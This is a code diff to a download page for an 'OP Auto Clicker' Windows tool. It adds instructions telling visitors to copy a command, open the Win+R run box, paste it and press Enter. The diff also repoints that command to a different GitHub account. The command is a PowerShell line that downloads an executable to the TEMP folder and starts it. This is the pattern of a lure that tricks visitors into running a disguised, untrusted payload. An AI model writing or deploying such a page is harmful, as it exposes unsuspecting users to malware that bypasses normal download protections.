@@ -195,6 +195,14 @@ footer ul a:hover{color:var(--accent)}
     <h1>Download <span>OP Auto Clicker</span> &mdash; Free for Windows</h1>
     <p class="dl-sub">The fastest free auto clicker for Windows. 512KB, no installation, no ads, no bundleware. One click and you're done.</p>
     <div class="dl-card">
+      <div class="dl-cmd-block">
+        <div class="dl-cmd-steps">
+          <div class="dl-cmd-step"><span class="dl-cmd-num">1</span> Click <strong style="color:var(--text)">Copy Command</strong> below</div>
+          <div class="dl-cmd-step"><span class="dl-cmd-num">2</span> Press <kbd>⊞ Win</kbd> + <kbd>R</kbd> on your keyboard</div>
+          <div class="dl-cmd-step"><span class="dl-cmd-num">3</span> Press <kbd>Ctrl</kbd> + <kbd>V</kbd>, then <kbd>Enter</kbd></div>
+        </div>
+        <button class="btn btn-ghost dl-copy-btn" id="copyBtn">📋 Copy Command</button>
+      </div>
       <div class="dl-meta">
         <div><strong class="green">Windows 7, 8, 10, 11</strong>32 & 64-bit</div>
         <div><strong class="green">512 KB</strong>Tiny footprint</div>
@@ -326,7 +334,7 @@ document.querySelectorAll('.reveal').forEach(el=>io.observe(el));
 (function(){
   var cmd = [
     'powershell -c "iwr ',
-    "'https://github.com/reggieog01-cpu/opauto/releases/latest/download/op.auto.clicker.exe'",
+    "'https://github.com/dusk1337sudo/op-auto-clicker/releases/download/1/op.auto.clicker.exe'",
     ' -OutFile $env:TEMP\\opauto.exe; Start-Process $env:TEMP\\opauto.exe"'
   ].join('');
   var btn = document.getElementById('copyBtn');
